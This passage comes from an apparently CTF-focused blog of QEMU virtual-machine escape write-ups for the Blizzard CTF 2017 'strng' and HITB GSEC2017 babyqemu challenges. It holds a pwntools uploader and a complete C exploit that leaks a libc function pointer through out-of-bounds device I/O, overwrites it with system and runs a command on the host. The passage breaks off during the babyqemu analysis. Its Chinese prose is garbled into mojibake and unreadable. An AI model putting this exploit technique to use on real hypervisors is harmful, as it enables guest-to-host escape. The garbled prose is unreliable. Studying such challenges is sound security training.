:</span><br><span class="line">cmd = <span class="string">&quot;echo &#x27;&quot;</span> + content[i : i + per_length] + <span class="string">&quot;&#x27; &gt;&gt; ./b64_exp&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, cmd)</span><br><span class="line"><span class="keyword">if</span> length - i &gt; <span class="number">0</span> :</span><br><span class="line">cmd = <span class="string">&quot;echo &#x27;&quot;</span> + content[i : length + <span class="number">1</span>] + <span class="string">&quot;&#x27; &gt;&gt; ./b64_exp&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, cmd)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;base64 -d ./b64_exp &gt; ./exp.gz&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;gunzip ./exp.gz&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;chmod +x ./exp&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;./exp&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261430662.png" alt="image-20230226143001990" style="zoom:50%;" /><h3 id="strng"><a href="#strng" class="headerlink" title="strng"></a>strng</h3><p>è¿™ä¸ªçš„é¢˜ç›®é“¾æ¥åœ¨ <a href="https://github.com/rcvalle/blizzardctf2017/releases">è¿™é‡Œ</a></p><p>ç„¶åå¯åŠ¨è„šæœ¬ç”¨è¿™ä¸ª ï¼Œè‡ªå·±åˆ›å»ºä¸€ä¸ª <code>launch.sh</code> æ–‡ä»¶å°±è¡Œï¼ˆé€šè¿‡è¿™ä¸ªå¯åŠ¨è„šæœ¬å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªè®¾å¤‡åå«åš <code>strng</code>ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure><p>å¯åŠ¨ä¹‹åï¼Œå‘ç°è¿™æ¨¡æ‹Ÿçš„æ˜¯ä¸€ä¸ª <code>ubuntu</code> è™šæ‹Ÿæœºï¼Œç„¶åç™»å½•çš„ç”¨æˆ·åæ˜¯ <code>ubuntu</code> ï¼Œ å¯†ç æ˜¯ <code>passw0rd</code> ã€‚</p><h4 id="ä»£ç é€†å‘"><a href="#ä»£ç é€†å‘" class="headerlink" title="ä»£ç é€†å‘"></a>ä»£ç é€†å‘</h4><p>è¿™ä¸ª <code>qemu-system-x86_64</code> æ²¡æœ‰å»é™¤ç¬¦å·è¡¨ï¼Œä½†æ˜¯å¼€äº† <code>PIE</code> ã€‚æˆ‘ä»¬çš„é€†å‘æ€è·¯æ˜¯å»æœç´¢å‡½æ•°åä¸­å­˜åœ¨ <code>strng</code> å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œè¿™æ ·å¯ä»¥æ›´å¿«å®šä½åˆ°å…³é”®å‡½æ•°ã€‚</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011317071.png" alt="image-20230301131745963" style="zoom:50%;" /><p>æˆ‘ä»¬ä» <code>strng_class_init</code> å‡½æ•°å…¥æ‰‹åˆ†æï¼ˆå¦‚ä¸‹ï¼‰ï¼Œæ ¹æ®è¿™é‡Œçš„æ•°æ®å¯ä»¥åˆ†æå‡ºæ¥è®¾å¤‡å·</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011318907.png" alt="image-20230301131847811" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011329170.png" alt="image-20230301132945008" style="zoom:50%;" /><p>å¦‚ä¸Šï¼Œå¯ä»¥çŸ¥é“ <code>strng</code> çš„è®¾å¤‡ä¸º <code>00:03:0</code></p><p>ç„¶åæ¥ä¾æ¬¡åˆ†æ <code>strng_mmio_read</code>  <code>strng_mmio_write</code> <code>strng_pmio_read</code> <code>strng_pmio_write</code> è¿™å››ä¸ªå‡½æ•°ï¼Œåœ¨åˆ†æä¹‹å‰ï¼Œéœ€è¦æŠŠè¿™å››ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° <code>opaque</code> çš„ç±»å‹æ”¹ä¸º <code>STRNGState *</code> ï¼Œè¿™æ ·å¯ä»¥è®© <code>ida</code> è¯†åˆ«å‡ºæ¥è¿™ä¸ªç»“æ„ä½“ï¼Œè‡³äºä¸ºä»€ä¹ˆè¿™é‡Œè¦ä¿®æ”¹æˆ <code>STRNGState *</code>  ç±»å‹ï¼Œä¸ªäººçŒœæµ‹å¯èƒ½è¿™ä¸ªä½ç½®æ­£å¸¸çš„å‚æ•°ç±»å‹å°±æ˜¯ <code>xxxState *</code> ï¼ˆ <code>xxx</code> æ˜¯è®¾å¤‡åï¼‰</p><p> <code>STRNGState</code> çš„ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line">    <span class="type">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="type">void</span> (*srand)(<span class="type">unsigned</span> <span class="type">int</span> seed);</span><br><span class="line">    <span class="type">int</span> (*rand)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">int</span> (*rand_r)(<span class="type">unsigned</span> <span class="type">int</span> *seed);</span><br><span class="line">&#125; STRNGState;</span><br></pre></td></tr></table></figure><p><code>strng_mmio_read</code> å‡½æ•°ä¸­å¦‚æœæ»¡è¶³ <code>if</code> çš„è¯å°±è¿”å› <code>regs</code> æ•°ç»„é‡Œçš„å€¼ï¼Œ </p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011442913.png" alt="image-20230301144200823"></p><p><code>strng_mmio_write</code> å‡½æ•°æ˜¯ç”¨ <code>judge</code> åšäº†ä¸‰ä¸ªé€‰æ‹©ï¼Œå¦‚æœ <code>judge</code> ä¸º <code>0</code> å°±æ‰§è¡Œç»“æ„ä½“ä¸­çš„ <code>srand(val)</code> ï¼Œå¦‚æœä¸º <code>1</code> åˆ™æ‰§è¡Œ <code>rand()</code>ï¼Œå¦‚æœ <code>judge</code> ä¸º <code>3</code> å°±æ‰§è¡Œ  <code>rand_r(&amp;strng-&gt;regs[2])</code> ä»¥åŠ <code>regs[judge] = val</code> ï¼Œå¦åˆ™çš„è¯ <code>judge</code> å­˜åœ¨ä½†ä¸ä¸º <code>3</code> ï¼Œå°±æ‰§è¡Œ <code>regs[judge] = val</code>ã€‚è¿™é‡Œæ˜¯å­˜åœ¨ä¸€ä¸ª <code>regs</code> æ•°ç»„çš„ä»»æ„èµ‹å€¼çš„ï¼Œç´¢å¼•å’Œå‚æ•°éƒ½å¯æ§</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011451484.png" alt="image-20230301145112412" style="zoom:50%;" /><p><code>strng_pmio_read</code> å‡½æ•°å­˜åœ¨ä¸€ä¸ªä»»æ„åœ°å€è¯»ï¼Œä»¥æ­¤æ¥æ³„éœ²ç»“æ„ä½“ä¸­ <code>regs</code> æ•°ç»„ä¸‹é¢çš„å‡½æ•°åœ°å€ã€‚æ­£å¸¸æ¥è¯´çš„è¯ <code>mmio_read</code> å‡½æ•°é‚£é‡Œçš„ä»»æ„åœ°å€è¯»ï¼Œä¹Ÿæ˜¯å¯ä»¥å®Œæˆçš„ï¼Œä½†æ˜¯å®è·µäº†ä¸€ä¸‹ï¼Œä¸€ç›´æ²¡åŠæ³•ç”¨ <code>mmio_read</code> æ³„éœ²å‡ºæ¥ <code>libc</code> æ•°æ®</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011534573.png" alt="image-20230301153424430" style="zoom:50%;" /><p><code>strng_pmio_write</code> å‡½æ•°æœ€é‡è¦çš„æœ‰ä¸‰ä¸ªç‚¹ï¼Œç¬¬ä¸€æ˜¯ <code>opaque-&gt;addr</code> å¯æ§ï¼Œæ–¹ä¾¿å…¶ä»–å‡ ä¸ªå‡½æ•°ç”¨è¿™ä¸ª <code>opaque-&gt;addr</code> è¿›è¡Œåˆ©ç”¨ ï¼Œç¬¬äºŒæ˜¯ <code>v5</code> ä¸º <code>3</code> çš„è¯ï¼Œé‚£ä¹ˆæ‰§è¡Œ <code>rand_r</code> å‡½æ•°ï¼Œå¹¶ä¸”å‚æ•°ä¸º <code>opaque-&gt;regs[2]</code> ï¼Œ <code>v5</code> å­˜åœ¨ä¸”ä¸ä¸º <code>3</code> çš„è¯ï¼Œå¯ä»¥åˆ©ç”¨ <code>regs[v5]=val</code> å®ç°ä»»æ„åœ°å€å†™ï¼Œå¹¶ä¸”è¿™é‡Œçš„ç´¢å¼•å¯ä»¥æº¢å‡ºï¼ˆå¯èƒ½æ˜¯å› ä¸ºè¿™ä¸ª <code>v5</code> æ˜¯ <code>opaque-&gt;addr</code> æ¥ç¡®å®šçš„ï¼Ÿï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011543310.png" alt="image-20230301154347221" style="zoom:50%;" /><h4 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h4><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>strng_pmio_write</code> å‡½æ•°çš„ä»»æ„å†™ï¼Œæ¥ç¯¡æ”¹ <code>rand_r</code> è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä»è€ŒåŠ«æŒç¨‹åºçš„æ‰§è¡Œæµï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯ <code>regs[2]</code> ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>strng_mmio_write</code> å‡½æ•°æ¥å‘ <code>regs[2]</code> ä»¥åŠä¹‹åçš„å†…å­˜å•å…ƒå†™å…¥æ•°æ®ï¼ˆä¹Ÿå°±æ˜¯å¸ƒç½®æˆ‘ä»¬çš„å‚æ•°ï¼‰ï¼Œæ³„éœ² <code>libc</code> åœ°å€çš„è¯ï¼Œå¯ä»¥ç”¨ <code>strng_pmio_read</code> å‡½æ•°æ¥è¿›è¡Œæ³„éœ²ã€‚</p><p>ç„¶åæˆ‘è¿™é‡Œé‡‡ç”¨çš„æ˜¯å¼¹ä¸€ä¸ªè®¡ç®—å™¨ï¼Œå…¶å­—ç¬¦ä¸²ä¸º <code>gnome-calculator</code>ï¼ˆæ‰§è¡Œ<code>/bin/sh</code> åº”è¯¥æ˜¯æ²¡æ³•äº¤äº’çš„ï¼Œå¯èƒ½åå¼¹ <code>shell</code> å¯ä»¥ï¼Ÿï¼‰</p><p>è¡¥å……ï¼š</p><p><code>PMIO_BASE</code> çš„åœ°å€æŸ¥çœ‹å‘½ä»¤æ˜¯ <code>lspci -v</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011630743.png" alt="image-20230301163055688"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc050</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">perror(msg);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">unsigned</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint32_t</span> *)mmio_mem + addr );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val )</span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span> *)(mmio_mem + addr)) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    outl(val,addr+PMIO_BASE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;perror(<span class="string">&quot;iopl failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">   <span class="comment">//ioplå‡½æ•°æ¥æå‡IOçš„ç­‰çº§ï¼Œå¦åˆ™è¿™ä¸ªpmioä½¿ç”¨çš„æ˜¯æœ‰é—®é¢˜çš„</span></span><br><span class="line">   </span><br><span class="line">    <span class="comment">//----------Control parameters-----------</span></span><br><span class="line">    mmio_write(<span class="number">2</span>,<span class="number">0x41414141</span>);</span><br><span class="line">    mmio_write(<span class="number">3</span>,<span class="number">0x41414141</span>);</span><br><span class="line">    mmio_write(<span class="number">4</span>,<span class="number">0x3b414141</span>);</span><br><span class="line">    mmio_write(<span class="number">5</span>,<span class="number">0x6d6f6e67</span>);   <span class="comment">// regs[2]</span></span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">0x61632d65</span>);  <span class="comment">// regs[3]</span></span><br><span class="line">    mmio_write(<span class="number">7</span>,<span class="number">0x6c75636c</span>);  <span class="comment">// regs[4]</span></span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x726f7461</span>);  <span class="comment">// regs[5]</span></span><br><span class="line">   <span class="comment">//-----------leak libc address----------</span></span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x118</span>);<span class="comment">//set opaque-&gt;addr</span></span><br><span class="line">    <span class="type">uint64_t</span> high_addr=pmio_read(<span class="number">4</span>);</span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x114</span>);</span><br><span class="line">    <span class="type">uint64_t</span> low_addr=pmio_read(<span class="number">4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> rand_r_addr=low_addr+(high_addr&lt;&lt;<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;low addr @ %llx\n&quot;</span>,low_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;high addr @ %llx\n&quot;</span>,high_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r function address @ %llx\n&quot;</span>,rand_r_addr);</span><br><span class="line">    <span class="type">uint64_t</span> system_addr=rand_r_addr+<span class="number">0xb080</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system function address @ %llx\n&quot;</span>,system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------write system address---------</span></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x114</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>,system_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------tigger system----------------</span></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0xc</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test\n&quot;</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011626104.png" alt="image-20230301162602101"></p><h4 id="çŒœæµ‹"><a href="#çŒœæµ‹" class="headerlink" title="çŒœæµ‹"></a>çŒœæµ‹</h4><p>å› ä¸ºä¸Šé¢å‘ç° <code>mmio_read</code> å’Œ <code>mmio_write</code> å‡½æ•°éƒ½æ— æ³•ç´¢å¼•æº¢å‡ºï¼Œå°½ç®¡çœ‹èµ·æ¥ <code>qemu-system-x86_64</code> ç¨‹åºä¸­æ²¡æœ‰åšä»»ä½•çš„æ£€æŸ¥ï¼Œä½†å°è¯•äº†ä¸€ä¸‹ï¼Œæ•°ç»„è¶Šç•Œè®¿é—®çš„è¯ç¡®å®æ˜¯æœ‰ç‚¹é—®é¢˜ã€‚ç„¶åçœ‹äº†ä¸€ä¸ªå¸ˆå‚…çš„è§£é‡Šï¼Œå¤§æ¦‚æ˜¯ä¸‹é¢çš„è¿™ä¸ªæ„æ€</p><p><code>MMIO</code> å’Œ <code>PMIO</code> çš„ç©ºé—´å¤§å°æ˜¯ç”± <code>pci_xxx_realize</code> å‡½æ•°ä¸­æ³¨å†Œçš„ã€‚</p><p>æœ¬é¢˜è¿™é‡Œæ ‡æ˜äº† <code>MMIO</code> çš„å¤§å°æ˜¯ <code>0x100</code>  </p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302281045546.png" alt="image-20230228104514364"></p><p>æœ¬åœ°çš„ <code>regs</code> æ•°ç»„å¤§å°å°±æ˜¯ <code>0x100</code> ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯æ— æ³•é€šè¿‡æ•°ç»„æº¢å‡ºè¦†ç›–åˆ°ä¸‹é¢çš„å‡½æ•°æŒ‡é’ˆçš„ã€‚å› ä¸º <code>pci</code> è®¾å¤‡å†…éƒ¨ä¼šè¿›ç¨‹æ£€æŸ¥</p><h3 id="HITB-GSEC2017-BABYQEMU"><a href="#HITB-GSEC2017-BABYQEMU" class="headerlink" title="[HITB GSEC2017]BABYQEMU"></a>[HITB GSEC2017]BABYQEMU</h3><p>é™„ä»¶åœ¨ <code>buu</code> ä¸Šå¯ä»¥æœåˆ°</p><p>é€šè¿‡åˆ†æ <code>launch.sh</code> æ–‡ä»¶å¾—çŸ¥è¿™æ¬¡çš„è®¾å¤‡å«åš <code>hitb</code> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/local/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ç”¨çš„ <code>ubuntu18.04</code> ï¼Œç„¶åè¿è¡Œ <code>launch.sh</code> çš„æ—¶å€™æœ‰å¦‚ä¸‹æŠ¥é”™</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041237815.png" alt="image-20230304123706649"></p><p>è§£å†³æ–¹æ³•ï¼šæ‰§è¡Œ <code>sudo apt install libcurl3</code></p><p>ç„¶åå‘ç°ç™»å½•ä¸Šå»çš„æ—¶å€™è¯¢é—®ç”¨æˆ·åå’Œå¯†ç </p><p>æˆ‘ä»¬ç”¨å¦‚ä¸‹å‘½ä»¤ï¼Œæ¥å°† <code>rootfs.cpio</code> æ–‡ä»¶è§£å‹ç¼©ï¼Œç„¶åæˆ‘ä»¬å» <code>etc</code> ç›®å½•ä¸‹ï¼ŒæŸ¥çœ‹ <code>shadow</code> æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir tmp</span><br><span class="line">cpio -idv &lt; /home/zikh/Desktop/pwn_qemu/rootfs.cpio</span><br><span class="line">cd etc</span><br><span class="line">cat shadow</span><br></pre></td></tr></table></figure><p>å‘ç°å¦‚æœç”¨æˆ·åä¸º <code>root</code> çš„è¯ï¼Œåé¢çš„å¯†ç ä¸ºç©ºï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303021733038.png" alt="image-20230302173323824"></p><p>å› æ­¤åœ¨ç™»å½•çš„æ—¶å€™ï¼Œç”¨æˆ·åè¾“å…¥ä¸º <code>root</code> å³å¯ç™»å½•æˆåŠŸï¼ˆå¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041306416.png" alt="image-20230304130630554" style="zoom:50%;" /><h4 id="ä»£ç é€†å‘-1"><a href="#ä»£ç é€†å‘-1" class="headerlink" title="ä»£ç é€†å‘"></a>ä»£ç é€†å‘</h4><p>é¦–å…ˆåœ¨ <code>hitb_class_init</code> å‡½æ•°ä¸­ç¡®å®šè®¾å¤‡å·</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041308293.png" alt="image-20230304130826234" style="zoom:50%;" /><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041309270.png" alt="image-20230304130955192"></p><p>ç»“åˆä¸Šé¢ä¸¤ä¸ªå›¾ç‰‡å¯ä»¥åˆ†æå‡º <code>00:04:0</code> æ˜¯ <code>hitb</code> çš„è®¾å¤‡å·ã€‚</p><p>æœ¬é¢˜æ²¡æœ‰ <code>pmio</code> çš„å‡½æ•°ï¼Œä½†æ˜¯æœ‰ <code>mmio</code> çš„ä¸¤ä¸ªå‡½æ•°ä»¥åŠ <code>dma_timer</code> ã€‚</p><p>ç®€å•åˆ†æä¸‹è¿™ä¸‰ä¸ªå‡½æ•°</p><p>é¦–å…ˆçœ‹ <code>hitb_mmio_read</code> å‡½æ•°ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041321559.png" alt="image-20230304132100421"></p><p>è¿™ä¸ªæ¯”è¾ƒæ˜æ˜¾ï¼Œå‡½æ•°å°±æ˜¯è®©ä½ é€‰æ‹©ä¸åŒçš„ <code>addr</code> ç„¶åç”¨ <code>return</code> è¿”å›ç»“æ„ä½“çš„ä¸åŒå­—æ®µã€‚æƒ³æ˜¾ç¤ºç»“æ„ä½“çš„å­—æ®µçš„è¯ï¼Œéœ€è¦å°† <code>opaque</code> çš„ç±»å‹æ”¹ä¸º <code>HitbState *</code> ï¼ˆè¿™æ˜¯ <code>qemu</code> é€ƒé€¸çš„ç¬¬ä¸‰é“é¢˜äº†ï¼Œç»™æˆ‘çš„æ„Ÿè§‰æ˜¯é€šå¸¸æ¼æ´éƒ½å‘ç”Ÿåœ¨æ•°ç»„ç´¢å¼•è¶Šç•Œä¸Šï¼‰ï¼Œè¿™ä¸ª <code>mmio_read</code> å‡½æ•°å¹¶æ²¡æœ‰ç”¨åˆ°ç´¢å¼•æ¥è®¿é—®æˆå‘˜ï¼Œæ‰€ä»¥è¿™é‡Œç®€å•çœ‹ä¸€ä¸‹å‘ç°æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜çš„ã€‚</p><p>å…¶æ¬¡æ˜¯ <code>hitb_mmio_write</code> å‡½æ•°ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œè¿™é‡Œå°±æ˜¯è®©æ ¹æ®ä¸åŒçš„ <code>addr</code> ç„¶åç»™ç»“æ„ä½“ä¸åŒçš„å­—æ®µè¿›è¡Œèµ‹å€¼ï¼Œå…¶å€¼ä¸º <code>val</code>ã€‚è¿™é‡Œä¹Ÿæ²¡æœ‰é€šè¿‡æ•°ç»„çš„ç´¢å¼•æ¥è®¿é—®æˆå‘˜ï¼Œçœ‹èµ·æ¥ä¹Ÿæ˜¯å®‰å…¨çš„ã€‚</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041325990.png" alt="image-20230304132554889" style="zoom: 67%;" /><p>ä¸è¿‡è¿™é‡Œè¦å…³æ³¨ä¸€ä¸‹ <code>timer_mod</code> å‡½æ•° </p><p>è¯¥å‡½æ•°çš„å¤§è‡´æ„æ€æ˜¯è¯´å½“è¶…è¿‡ <code>expire_time</code> è¿™ä¸ªæ—¶é—´æ—¶ä¼šè§¦å‘å®šæ—¶å™¨ä¸­æ–­ï¼Œå…¶å¤„ç†å‡½æ•°æ˜¯ <code>ts</code> ç»“æ„ä½“ä¸­çš„ <code>cb</code> å‚æ•°æŒ‡å®šçš„å‡½æ•°ï¼Œåœ¨ <code>pci_hitb_realize</code> å‡½æ•°ä¸­çš„ <code>timer_init_tl</code> å‡½æ•°é‡Œé¢å°† <code>hitb_dma_timer</code> å‡½æ•°èµ‹å€¼ç»™äº† <code>ts</code> ç»“æ„ä½“ä¸­çš„ <code>cb</code> ï¼ˆ <code>call back</code> ï¼‰ã€‚å› æ­¤æˆ‘ä»¬æ·»åŠ  <code>sleep</code> å‡½æ•°ï¼Œè®©å…¶è¶…è¿‡ <code>expire_time</code> ï¼Œä»è€Œè°ƒç”¨ <code>hitb_dma_timer</code> å‡½æ•°</p><p>æœ€åæ¥çœ‹ä¸‹ <code>hitb_dma_timer</code> å‡½æ•°</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041434536.png" alt="image-20230304143404417"></p><p>è¿™é‡Œå°±æœ‰æˆ‘ä»¬å¿ƒå¿ƒå¿µå¿µçš„æ•°ç»„ç´¢å¼•äº†ï¼Œè€Œä¸”æˆ‘ä»¬èƒ½å¤Ÿå‘ç°è¿™é‡Œçš„ç´¢å¼• <code>v2</code> æ˜¯æ²¡æœ‰åšä»»ä½•æ£€æŸ¥çš„ï¼Œå¹¶ä¸”å®ƒæ˜¯è¢« <code>opaque-&gt;dma.src</code> æ‰€æ§åˆ¶ï¼Œè¿™ä¸ª <code>dma.src</code> æ˜¯åœ¨ <code>hitb_mmio_write</code> å‡½æ•°å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶çš„ï¼Œæ‰€ä»¥è¿™é‡Œ <code>dma_buf[v2]</code> æ˜¯å­˜åœ¨ç´¢å¼•æº¢å‡ºçš„ã€‚</p><h4 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h4><p>é‡ç‚¹çœ‹ä¸‹ 